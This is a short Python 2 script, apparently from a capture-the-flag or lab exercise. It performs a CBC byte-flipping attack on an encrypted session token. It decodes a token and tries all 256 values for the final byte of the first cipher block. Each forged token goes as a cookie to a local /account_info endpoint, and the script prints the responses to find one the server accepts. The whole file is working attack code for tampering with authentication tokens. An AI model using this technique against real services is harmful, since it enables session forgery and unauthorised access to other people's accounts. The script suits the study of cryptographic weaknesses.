# -*- coding: utf-8 -*-
__author__ = 'angelwhu'

import base64
import requests
import urllib

crypt_bytes = base64.b64decode("SnVzdERvSXQ6aXYvY2JjITtUeAf32KQiV/neB7nkpZ1Ly1pisvcU3nyrVUq53dGW")

print crypt_bytes
print len(crypt_bytes)

session = requests.session()

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 9.0; Z832 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "x-requested-with": "XMLHttpRequest"
}

for i in range(256):
    token = crypt_bytes[:15] + chr(i) + crypt_bytes[16:32]
    check_token = base64.b64encode(token)
    print check_token

    cookies = {"token": check_token}
    response = session.get("http://127.0.0.1:8080/account_info", cookies=cookies, headers=headers)
    print u''.join(response.text).encode('utf-8').strip();
    print len(response.text)
